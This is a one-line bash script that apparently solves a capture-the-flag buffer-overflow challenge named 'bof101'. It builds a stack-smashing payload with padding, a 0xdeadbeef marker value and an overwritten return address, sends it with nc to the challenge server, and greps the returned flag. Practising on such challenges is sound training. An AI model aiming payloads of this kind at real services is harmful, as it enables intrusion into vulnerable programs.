#!/bin/bash

python -c 'import sys; sys.stdout.buffer.write(b"A"*140 + b"\xef\xbe\xad\xde" + b"B"*8 + b"\xf6\x11\x40\x00\x00\x00\x00\x00")' | nc bof101.sstf.site 1337 | grep -o "SCTF{.*}"
